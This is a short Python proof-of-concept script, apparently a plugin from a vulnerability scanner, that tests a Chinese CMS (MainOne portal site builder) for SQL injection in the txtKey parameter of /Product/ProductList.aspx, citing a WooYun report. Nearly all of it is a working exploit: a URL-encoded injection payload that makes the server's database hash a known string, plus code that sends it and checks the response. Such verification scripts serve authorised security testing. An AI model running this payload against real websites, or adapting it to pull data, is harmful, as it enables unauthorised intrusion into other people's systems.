#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 铭万门户建站系统ProductList SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0104558
author: Lucifer
description: 文件/Product/ProductList.aspx参数txtKey存在注入漏洞。
'''
import sys
import requests
import warnings
from termcolor import cprint

class mainone_ProductList_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/Product/ProductList.aspx?type=Category&ID=-1&txtKey=%%27%2BAnD%201=(SeLeCt%20Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27)))%20AnD%2B%27%%27=%27"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在铭万门户建站系统ProductList SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "铭万门户建站系统ProductList SQL注入", payload, req.text
            else:
                cprint("[-]不存在mainone_ProductList_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = mainone_ProductList_sqli_BaseVerify(sys.argv[1])
    testVuln.run()